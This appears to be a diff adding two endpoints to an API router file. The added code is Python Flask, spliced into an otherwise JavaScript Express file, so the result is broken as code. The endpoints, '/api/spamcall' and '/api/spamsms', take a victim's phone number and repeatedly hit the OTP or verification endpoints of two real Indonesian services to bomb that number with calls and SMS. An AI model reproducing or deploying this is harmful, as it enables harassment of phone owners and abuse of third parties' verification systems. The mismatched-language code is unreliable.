@@ -797,6 +797,77 @@ router.get('/infogempa', async (req, res, next) => {
 		})
 })
 
+@app.route('/api/spamcall', methods=['GET','POST'])
+def spamcall():
+    if request.args.get('no'):
+        no = request.args.get('no')
+        if str(no).startswith('8'):
+            hasil = ''
+            kyaa = post('https://id.jagreward.com/member/verify-mobile/%s' % no).json()
+            print(kyaa['message'])
+            if 'Anda akan menerima' in kyaa['message']:
+                hasil += '[!] Berhasil mengirim spam call ke nomor : 62%s' % no
+            else:
+                hasil += '[!] Gagal mengirim spam call ke nomor : 62%s' % no
+            return {
+                'status': 200,
+                'logs': hasil
+            }
+        else:
+            return {
+                'status': False,
+                'msg': '[!] Tolong masukkan nomor dengan awalan 8'
+            }
+    else:
+        return {
+            'status': False,
+            'msg': '[!] Masukkan parameter no' 
+        }
+@app.route('/api/spamsms', methods=['GET','POST'])
+def spamming():
+    if request.args.get('no'):
+        if request.args.get('jum'):
+            no = request.args.get('no')
+            jum = int(request.args.get('jum'))
+            if jum > 20: return {
+                'status': 200,
+                'msg': '[!] Max 20 ganteng'
+            }
+            url = 'https://www.lpoint.co.id/app/member/ESYMBRJOTPSEND.do'
+            head = {'UserAgent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'}
+            data = {'pn': '',
+                'bird': '',
+                'webMbrId': '',
+                'webPwd': '',
+                'maFemDvC': '',
+                'cellNo': no,
+                'otpNo': '',
+                'seq': '',
+                'otpChk': 'N',
+                'count': ''
+            }
+            hasil = 'bayar tagihan ajg cpt'
+            for i in range(jum):
+                kyaa = post(url, headers=head, data=data).text
+                if 'error' in kyaa:
+                    hasil += '[!] Gagal\n'
+                else:
+                    hasil += '[!] Sukses\n'
+            return {
+                'status': 200,
+                'logs': hasil
+            }
+        else:
+            return {
+                'status': False,
+                'msg': '[!] Masukkin parameter jum juga ganteng'
+            }
+    else:
+        return {
+            'status': False,
+            'msg': '[!] Masukkan parameter no'
+        }
+        
 router.get('/hadits', async (req, res, next) => {
         var apikeyInput = req.query.apikey,
             kitab = req.query.kitab,
